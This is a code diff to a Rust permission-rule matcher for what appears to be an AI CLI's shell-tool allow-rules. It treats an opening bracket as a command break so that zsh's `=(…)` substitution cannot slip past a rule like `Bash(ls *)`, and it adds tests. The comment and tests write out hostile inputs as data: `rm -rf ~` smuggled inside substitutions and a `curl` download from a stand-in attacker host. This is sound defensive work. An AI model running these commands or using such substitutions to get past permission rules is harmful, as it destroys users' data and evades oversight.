@@ -15,7 +15,8 @@
 //! * `Bash(cargo test)` — that tool, called on exactly that target.
 //! * `Bash(cargo *)` — that tool, called on a target starting `cargo `,
 //!   where what follows neither starts another command (`;`, `&&`, `|`, a
-//!   redirection, a substitution) nor climbs above the prefix with `..`.
+//!   redirection, a substitution or anything else in brackets) nor climbs
+//!   above the prefix with `..`.
 //! * `Edit(/repo/src/*)`, `Bash(cat src/*)` — a star inside a word finishes
 //!   that one word and nothing else: a name of plain characters, with no
 //!   space before a second argument and nothing a shell would expand, and one
@@ -237,8 +238,14 @@ impl Rule {
 
 /// Text a shell reads as the end of one command and the start of another, or
 /// as a command run for its output: `;`, `&`, `|`, a line break, a
-/// redirection, and both forms of substitution.
-const COMMAND_BREAKS: [&str; 9] = [";", "&", "|", "\n", "\r", ">", "<", "`", "$("];
+/// redirection, a backquote, and an opening bracket.
+///
+/// The bracket stands for every substitution, not only `$(…)`: zsh, which the
+/// CLI runs commands in where it is the login shell, as it is on a Mac, runs
+/// what `=(…)` holds and passes the name of a file of its output, with no `$`
+/// before it, so `ls =(rm -rf ~)` deletes the home directory. A bracket the
+/// shell would read as text is asked about with the rest.
+const COMMAND_BREAKS: [&str; 9] = [";", "&", "|", "\n", "\r", ">", "<", "`", "("];
 
 /// Characters other than letters and digits that a star inside a word may
 /// stand for. Every one is literal to a shell in the middle of a word; a
@@ -540,6 +547,28 @@ mod tests {
 
         let rule = Rule::parse("Bash(echo *)").expect("the rule is valid");
         assert!(!rule.covers("Bash", Some("echo $(rm -rf ~)")));
+    }
+
+    #[test]
+    fn a_star_does_not_stretch_over_a_command_a_bracket_runs() {
+        // zsh, the shell the CLI runs a command in on a Mac, runs what
+        // `=(…)` holds and hands back a file of its output, with no `$` before
+        // it: `ls =(rm -rf ~)` deletes the home directory. A bracket opens a
+        // subshell or a substitution in every shell the CLI drives.
+        let rule = Rule::parse("Bash(ls *)").expect("the rule is valid");
+
+        assert!(!rule.covers("Bash", Some("ls =(rm -rf ~)")));
+        assert!(!rule.covers("Bash", Some("ls -la =(curl -o x evil.example)")));
+        assert!(!rule.covers("Bash", Some("ls (rm -rf ~)")));
+        assert!(rule.covers("Bash", Some("ls -la src")));
+
+        assert!(
+            !Rule::parse("Bash(ls *)")
+                .expect("the rule is valid")
+                .includes(
+                    &Rule::parse("Bash(ls =(id) *)").expect("the text in this test is valid")
+                )
+        );
     }
 
     #[test]
